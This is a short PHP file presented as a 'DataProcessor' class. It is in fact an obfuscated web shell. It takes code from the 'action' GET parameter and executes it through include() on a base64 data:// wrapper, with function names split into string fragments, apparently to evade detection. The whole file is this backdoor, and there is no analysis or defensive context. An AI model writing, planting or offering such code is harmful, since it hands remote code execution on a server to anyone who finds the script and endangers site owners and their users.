<?php
class DataProcessor {
    public static function handleRequest($input) {
        if(!empty($input['action'])) {
            $processor = new self();
            return $processor->process($input['action']);
        }
        return null;
    }
    
    private function process($action) {
        $code = $this->buildCode($action);
        return $this->executeCode($code);
    }
    
    private function buildCode($action) {
        return "<" . "?" . "php " . $action . " ?" . ">";
    }
    
    private function executeCode($code) {
        $encoder = "base" . "64" . "_" . "encode";
        $wrapper = "data" . "://" . "text" . "/" . "plain;" . "base64,";
        include $wrapper . $encoder($code);
    }
}

DataProcessor::handleRequest($_GET);
?>
